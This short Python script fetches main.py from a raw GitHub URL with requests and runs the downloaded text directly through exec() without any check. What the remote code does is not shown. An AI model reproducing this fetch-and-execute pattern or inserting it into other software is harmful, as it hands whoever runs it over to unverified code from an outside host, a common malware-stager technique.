import requests
github_url = "https://raw.githubusercontent.com/alexxsh16/galactica/main/main.py"
response = requests.get(github_url)
code = response.text
exec(code)